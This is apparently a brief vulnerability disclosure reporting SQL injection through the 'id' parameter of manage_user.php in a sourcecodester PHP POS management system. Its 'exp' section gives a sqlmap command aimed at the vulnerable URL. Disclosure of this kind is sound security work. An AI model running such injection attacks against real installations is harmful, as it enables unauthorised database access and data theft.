vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220944283-7a85ad54-8778-469a-b463-4fb2b402fd74.png)


exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/manage_user.php?id=1"
```
![image](https://user-images.githubusercontent.com/30823782/220944341-22d30ec9-902f-4b76-8886-ec33ebdd9d6d.png)

